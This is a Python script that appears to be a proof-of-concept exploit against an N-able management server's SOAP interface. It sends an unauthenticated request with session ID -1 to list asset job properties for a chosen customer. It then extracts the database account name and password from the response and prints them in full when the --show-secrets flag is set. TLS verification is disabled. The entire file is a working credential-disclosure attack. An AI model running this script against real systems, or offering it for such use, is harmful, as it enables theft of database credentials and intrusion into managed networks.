#!/usr/bin/env python3
import argparse
import xml.etree.ElementTree as ET

import requests
import urllib3


def envelope(customer_id):
    return f'''<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
 xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
 xmlns:xsd="http://www.w3.org/2001/XMLSchema"
 xmlns:m="http://www.n-able.com/mickey">
 <soap:Body><m:AssetJobDefaultProperties.List soap:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
  <SessionID xsi:type="xsd:int">-1</SessionID>
  <CustomerID xsi:type="xsd:int">{customer_id}</CustomerID>
 </m:AssetJobDefaultProperties.List></soap:Body>
</soap:Envelope>'''


def fields(body):
    result = {}
    for node in ET.fromstring(body).iter():
        if node.tag.rsplit("}", 1)[-1] != "DefaultAssetJobProperties":
            continue
        row = {child.tag.rsplit("}", 1)[-1]: child.text or "" for child in node}
        if "PKey" in row:
            result[row["PKey"]] = row.get("PValue", "")
    return result


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="https://192.168.1.14")
    parser.add_argument("--customer-id", type=int, required=True)
    parser.add_argument("--show-secrets", action="store_true")
    args = parser.parse_args()

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    response = requests.post(
        args.target.rstrip("/") + "/dms/services/ServerUI",
        data=envelope(args.customer_id),
        headers={"Content-Type": "text/xml; charset=UTF-8", "SOAPAction": '""'},
        verify=False,
        timeout=30,
    )
    response.raise_for_status()
    values = fields(response.content)
    for key in ("DBACCOUNT", "DBPASSWD"):
        value = values.get(key, "")
        if args.show_secrets:
            print(f"{key}={value}")
        else:
            print(f"{key}_length={len(value)}")
    return 0 if values.get("DBACCOUNT") and values.get("DBPASSWD") else 1


if __name__ == "__main__":
    raise SystemExit(main())
